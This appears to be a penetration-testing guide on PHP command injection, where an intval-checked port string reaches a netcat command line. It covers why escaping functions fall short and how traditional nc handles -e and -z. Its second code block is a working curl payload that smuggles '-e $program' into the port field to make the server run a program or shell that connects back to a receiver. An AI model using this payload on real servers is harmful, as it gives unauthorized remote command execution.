# Follow the checked value into the actual process arguments

Use when source checks or coerces an input, then constructs a command from a different representation. Require the complete selected handler/route and actual PHP and child-tool implementation; an HTML number/url widget is not server-side validation. Review source statically before any execution, and keep CLI diagnostics separate from a web SAPI result.

## An integer prefix is not the original string

For a trusted PHP CLI, define `port_text` as selected public test data. This snippet performs only conversion/validation and prints representations; it does not launch nc:

~~~bash
"$php_bin" -r '$raw=$argv[1]; $n=intval($raw); var_export(["raw"=>$raw,"coerced"=>$n,"coerced_valid"=>filter_var($n,FILTER_VALIDATE_INT),"raw_valid"=>filter_var($raw,FILTER_VALIDATE_INT)]); echo PHP_EOL;' -- "$port_text"
~~~

Illustratively, a string beginning `1337` followed by a space and options can coerce to integer1337, while validating the original full string fails. A check on that integer does not sanitize `$port` if the command later interpolates the original string. Also check the permitted TCP range1–65535, scalar versus array inputs and strict false comparisons; an unrestricted integer filter is not a port-range validator. Trace IP validation and port validation separately to their exact sinks.

`escapeshellcmd` escapes shell metacharacters but leaves spaces and allows additional arguments. It does not keep each input in one argument or neutralize child-tool options. `escapeshellarg` addresses one shell-argument boundary, but a leading option can still be meaningful to the child; use validated canonical values and an argv-capable process API/fixed executable where suitable. The reviewed application's `exec($command . " 2>&1", $lines, $status)` captures redirected output and exit status separately. A quiet command or UI status text alone is not process-success evidence.

## Retain the selected nc-backed execution test

For an explicitly authorized test of a confirmed form that passes original port text to traditional nc, require its supported execute option, selected owned receiver and verified executable path. Start the receiver first. Define `tcp_url` as the exact route including `?expertmode=tcp`, `receiver_ip`/`receiver_port` as its numeric address/positive TCP port, `program` as the intended absolute executable and fresh `headers`/`body` captures:

~~~bash
port_text="$receiver_port -e $program"
curl --silent --show-error --connect-timeout 5 --max-time 30 \
  --data-urlencode "ip=$receiver_ip" --data-urlencode "port=$port_text" \
  --dump-header "$headers" --output "$body" \
  --write-out 'status=%{http_code}\n' "$tcp_url"
~~~

These field names/GET mode follow the observed contract; do not infer a hidden feature merely from its name or force it on unrelated sites. Use real session/CSRF prerequisites. A marker executable can test attachment; a selected shell reproduces the authorized command channel. The reviewed traditional netcat source executes its -e program after connection **before** deciding whether -z should skip ordinary byte shoveling; -z is not a universal guarantee against process execution. Build flags/wrappers and OpenBSD nc differ, so unsupported -e is a concrete implementation issue, not proof the dataflow is safe.

Correlate the peer, selected trigger and received marker/identity. The child inherits the web process's available authority; an illustrated UID33 web worker is not root. An HTTP timeout does not prove the callback/child ended, and each repeated POST can create another child. Track/stop only the owned process/receiver; a PTY changes terminal behavior rather than UID. A failed validation, argument parser, bind/connect, execution or capture step needs its own next decision rather than another guessed password/payload.

See [intval](https://www.php.net/manual/en/function.intval.php), [integer filters](https://www.php.net/manual/en/filter.constants.validation.php), [escapeshellcmd](https://www.php.net/manual/en/function.escapeshellcmd.php), [PHP exec](https://www.php.net/manual/en/function.exec.php) and [traditional netcat upstream source](https://salsa.debian.org/debian/netcat/-/blob/master/netcat.c).
